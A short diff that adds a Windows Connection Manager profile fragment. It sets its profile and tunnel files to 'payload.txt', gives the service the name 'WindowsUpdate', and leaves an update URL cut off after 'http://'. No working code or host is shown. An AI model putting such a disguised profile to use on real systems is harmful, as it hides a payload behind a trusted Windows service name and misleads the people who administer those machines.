@@ -1,0 +1,6 @@
+[Connection Manager]
+CMSFile=payload.txt
+ServiceName=WindowsUpdate
+TunnelFile=payload.txt
+[Settings]
+UpdateUrl=http://
